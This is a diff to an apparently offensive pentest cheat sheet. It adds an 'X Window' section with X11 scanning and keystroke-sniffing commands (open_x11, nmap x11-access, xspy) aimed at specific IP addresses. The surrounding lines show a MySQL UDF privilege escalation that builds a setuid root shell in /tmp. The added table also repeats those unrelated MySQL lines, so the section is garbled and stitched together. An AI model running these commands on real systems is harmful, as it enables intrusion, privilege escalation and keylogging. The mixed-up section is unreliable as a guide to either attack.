@@ -74,3 +74,18 @@
 |select * from npn into dumpfile '/usr/lib/raptor_udf2.so';|
 | create function do_system returns integer soname 'raptor_udf2.so'; |
 | select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell'); |
+
+
+### X Window Commond Vulnerability
+
+| How To Do   |
+| ------------- |
+| use auxiliary/scanner/x11/open_x11 |
+| nmap -p 6000 --script=x11-access 192.168.2.26,75 |
+|create table npn(line blob); |
+| xdpyinfo -display 192.168.2.75:0 | head -n 5 |
+|xspy -display 192.168.1.23:0 -delay 100|
+| create function do_system returns integer soname 'raptor_udf2.so'; |
+| select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell'); |
+
+
